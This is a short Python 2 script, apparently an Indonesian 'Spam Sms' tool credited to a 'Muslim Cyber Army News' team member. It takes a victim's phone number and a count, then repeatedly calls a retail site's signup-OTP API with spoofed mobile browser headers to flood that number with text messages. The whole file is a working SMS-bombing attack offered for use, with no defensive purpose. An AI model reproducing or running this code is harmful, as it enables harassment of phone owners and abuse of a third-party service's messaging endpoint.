import os, sys, time, requests, json

def lagi():
        l = raw_input('Mau Spam Lagi? [y/n]: ')
        if l =='y':
                main()
        elif l =='n':
               sys.exit()


def main():
        os.system('clear')
        os.system('figlet Spam Sms')
        banner = '''
+------------------------------------------+
[-] Author : Saeful Ramadhan
[-] Team   : Muslim Cyber Army News
[-] Github : https://github.com/saeful236
+------------------------------------------+
'''
        print(banner)
        print '[ EX: 08xxxx ]'
        nomor = raw_input('Nomor HP :')
        jumla = raw_input('Jumlah :')
        r = requests.Session()
        data = {'phone': nomor}
        datajson = json.dumps(data)
        a = 0
        for i in range(int(jumla)):
        	try:
        		a += 1
        		x = r.post('https://cmsapi.mapclub.com/api/signup-otp', data=datajson, headers={'Host': 'cmsapi.mapclub.com', 'Connection': 'keep-alive', 'Content-Length': '23', 'Accept': 'application/json, text/plain, */*', 'Origin': 'https://www.mapclub.com', 'Save-Data': 'on', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'content-type': 'application/json', 'Referer': 'https://www.mapclub.com/id/user/signup', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6,da;q=0.5,pt;q=0.4,jv;q=0.3'})
        		if 'ok' in x.text:
        			print 'Mengirim '+str(a)+' Berhasil => '+nomor
        		else:
        			print 'Mengirim '+str(a)+' Gagal => '+nomor
        	except requests.exceptions.ConnectionError:
        		print 'Check Your Connection'
        		
print "\033[1;92m Hijau,merah"

main()
lagi()
